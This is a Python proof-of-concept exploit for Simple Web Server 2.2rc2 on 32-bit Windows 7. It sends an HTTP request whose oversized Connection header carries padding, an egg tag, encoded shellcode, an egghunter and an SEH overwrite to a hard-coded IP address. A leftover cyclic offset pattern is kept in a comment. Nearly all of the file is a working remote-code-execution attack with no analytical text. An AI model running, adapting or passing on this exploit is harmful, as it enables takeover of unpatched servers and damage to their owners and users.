#!/usr/bin/python

####################################################################
# Application: Simple Web Server 2.2rc2                            #
# Author: VOSEC                                                    #
# Website: https://veilofsecurity.com                              #
# Tested OS: Windows 7 SP1 32bit                                   #
####################################################################

import socket
import sys

ip = "11.11.11.7"
port = 80
junk = "A"*1491
#junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3"
#junk = "A"*4992
jmp = "\xeb\xde\x90\x90"     #nSEH - jmp -34
egg = "W00TW00T"
#retn = "C"*4

retn = "\xb4\x10\xac\x6a"
buf =  ""
buf += "\x89\xe2\xd9\xc9\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x49\x78\x4b\x32"
buf += "\x75\x50\x77\x70\x67\x70\x43\x50\x4d\x59\x7a\x45\x35"
buf += "\x61\x39\x50\x35\x34\x4e\x6b\x30\x50\x36\x50\x4e\x6b"
buf += "\x50\x52\x44\x4c\x4c\x4b\x63\x62\x37\x64\x6c\x4b\x52"
buf += "\x52\x36\x48\x54\x4f\x38\x37\x50\x4a\x37\x56\x36\x51"
buf += "\x4b\x4f\x6e\x4c\x37\x4c\x45\x31\x33\x4c\x66\x62\x74"
buf += "\x6c\x77\x50\x6a\x61\x68\x4f\x76\x6d\x33\x31\x7a\x67"
buf += "\x4a\x42\x4a\x52\x33\x62\x43\x67\x4c\x4b\x42\x72\x52"
buf += "\x30\x4e\x6b\x62\x6a\x75\x6c\x6e\x6b\x52\x6c\x66\x71"
buf += "\x51\x68\x4b\x53\x50\x48\x56\x61\x6b\x61\x36\x31\x6c"
buf += "\x4b\x51\x49\x51\x30\x47\x71\x6a\x73\x4e\x6b\x47\x39"
buf += "\x37\x68\x39\x73\x67\x4a\x70\x49\x6e\x6b\x75\x64\x6e"
buf += "\x6b\x76\x61\x68\x56\x66\x51\x69\x6f\x4e\x4c\x4f\x31"
buf += "\x6a\x6f\x34\x4d\x63\x31\x78\x47\x74\x78\x69\x70\x42"
buf += "\x55\x49\x66\x76\x63\x73\x4d\x69\x68\x55\x6b\x71\x6d"
buf += "\x77\x54\x64\x35\x69\x74\x71\x48\x4e\x6b\x70\x58\x75"
buf += "\x74\x57\x71\x4b\x63\x43\x56\x4c\x4b\x76\x6c\x42\x6b"
buf += "\x4c\x4b\x43\x68\x65\x4c\x35\x51\x4e\x33\x4c\x4b\x46"
buf += "\x64\x6c\x4b\x56\x61\x58\x50\x6f\x79\x73\x74\x45\x74"
buf += "\x74\x64\x71\x4b\x31\x4b\x31\x71\x53\x69\x61\x4a\x32"
buf += "\x71\x69\x6f\x69\x70\x73\x6f\x63\x6f\x43\x6a\x6e\x6b"
buf += "\x45\x42\x78\x6b\x4e\x6d\x31\x4d\x75\x38\x76\x53\x44"
buf += "\x72\x35\x50\x55\x50\x65\x38\x72\x57\x42\x53\x66\x52"
buf += "\x63\x6f\x53\x64\x31\x78\x50\x4c\x61\x67\x64\x66\x65"
buf += "\x57\x4c\x49\x58\x68\x59\x6f\x4e\x30\x68\x38\x4a\x30"
buf += "\x56\x61\x55\x50\x33\x30\x55\x79\x39\x54\x42\x74\x76"
buf += "\x30\x62\x48\x56\x49\x6f\x70\x32\x4b\x55\x50\x69\x6f"
buf += "\x6a\x75\x33\x5a\x34\x4a\x32\x48\x76\x6b\x54\x4b\x36"
buf += "\x6b\x45\x52\x65\x38\x74\x42\x55\x50\x34\x51\x33\x6c"
buf += "\x4c\x49\x38\x66\x32\x70\x62\x70\x46\x30\x72\x70\x33"
buf += "\x70\x56\x30\x33\x70\x76\x30\x52\x48\x4a\x4a\x76\x6f"
buf += "\x4b\x6f\x49\x70\x39\x6f\x79\x45\x4c\x57\x50\x6a\x42"
buf += "\x30\x63\x66\x51\x47\x71\x78\x4d\x49\x4e\x45\x54\x34"
buf += "\x30\x61\x4b\x4f\x7a\x75\x4c\x45\x39\x50\x70\x74\x54"
buf += "\x4a\x69\x6f\x42\x6e\x54\x48\x70\x75\x38\x6c\x59\x78"
buf += "\x52\x47\x57\x70\x63\x30\x55\x50\x33\x5a\x53\x30\x71"
buf += "\x7a\x34\x44\x50\x56\x46\x37\x70\x68\x73\x32\x69\x49"
buf += "\x6a\x68\x33\x6f\x79\x6f\x4e\x35\x4c\x43\x4a\x58\x57"
buf += "\x70\x51\x6e\x77\x46\x6e\x6b\x44\x76\x61\x7a\x63\x70"
buf += "\x75\x38\x73\x30\x44\x50\x75\x50\x57\x70\x36\x36\x53"
buf += "\x5a\x73\x30\x72\x48\x30\x58\x4c\x64\x53\x63\x4a\x45"
buf += "\x69\x6f\x79\x45\x7a\x33\x53\x63\x70\x6a\x57\x70\x73"
buf += "\x66\x51\x43\x66\x37\x72\x48\x44\x42\x5a\x79\x48\x48"
buf += "\x63\x6f\x4b\x4f\x59\x45\x4b\x33\x69\x68\x57\x70\x43"
buf += "\x4d\x71\x38\x62\x78\x71\x78\x57\x70\x37\x30\x37\x70"
buf += "\x63\x30\x31\x7a\x65\x50\x76\x30\x32\x48\x46\x6b\x44"
buf += "\x6f\x56\x6f\x56\x50\x59\x6f\x79\x45\x52\x77\x42\x48"
buf += "\x61\x65\x32\x4e\x50\x4d\x45\x31\x4b\x4f\x38\x55\x33"
buf += "\x6e\x51\x4e\x79\x6f\x66\x6c\x56\x44\x44\x4f\x6f\x75"
buf += "\x52\x50\x59\x6f\x49\x6f\x4b\x4f\x49\x79\x6f\x6b\x39"
buf += "\x6f\x6b\x4f\x79\x6f\x55\x51\x68\x43\x44\x69\x58\x46"
buf += "\x34\x35\x49\x51\x6f\x33\x6f\x4b\x6b\x4e\x34\x4e\x64"
buf += "\x72\x4b\x5a\x73\x5a\x77\x70\x32\x73\x69\x6f\x49\x45"
buf += "\x42\x4a\x57\x70\x48\x43\x41\x41"


shellcode = buf
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

req = "GET / HTTP/1.1\r\n"
req += "Host: 11.11.11.7\r\n"
req += "Connection:" + junk + egg + buf + egghunter + jmp + retn + "\r\n"
req += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(req)
s.close()
